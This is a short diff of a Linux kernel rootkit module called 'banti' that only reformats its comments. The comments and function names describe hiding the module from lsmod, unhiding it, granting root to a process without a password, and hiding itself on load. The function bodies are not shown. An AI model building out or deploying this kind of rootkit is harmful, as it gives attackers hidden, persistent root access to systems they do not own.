@@ -36,9 +36,8 @@ static struct list_head *module_kobj_prev;
 
 
 /*
- * Get banti version
- *
- * Function returns build number and version of module
+ * Get banti version. Function returns build number and 
+ * version of module
  */
 const char* get_version(void)
 {
@@ -60,8 +59,6 @@ void init_banti(void)
 
 
 /*
- * Hide module
- *
  * Function hides module from module list so
  * it can not be checked with lsmod command
  */
@@ -85,10 +82,8 @@ void banti_module_hide(void)
 
 
 /*
- * Make module visible
- *
- * Function makes module visible again afther 
- * its hidden with banti_module_hide() function
+ * Make module visible. Function makes module visible again 
+ * afther its hidden with banti_module_hide() function
  */
 void banti_module_show(void)
 {
@@ -108,10 +103,8 @@ void banti_module_show(void)
 
 
 /*
- * Get root access for process id
- *
- * Function takes process id and gives it superuser
- * privilegies without password request
+ * Get root access for process id. Function takes process id 
+ * and gives it superuser privilegies without password request
  */
 void banti_got_root(void) 
 {
@@ -134,10 +127,8 @@ void banti_got_root(void)
 
 
 /*
- * Initialise rootkit module
- *
- * Function initialises module with insmod command
- * is given and hides it afther initialisation
+ * Initialise rootkit module. Function initialises module with 
+ * insmod command is given and hides it afther initialisation
  */
 static int __init banti_kit_init(void)
 {
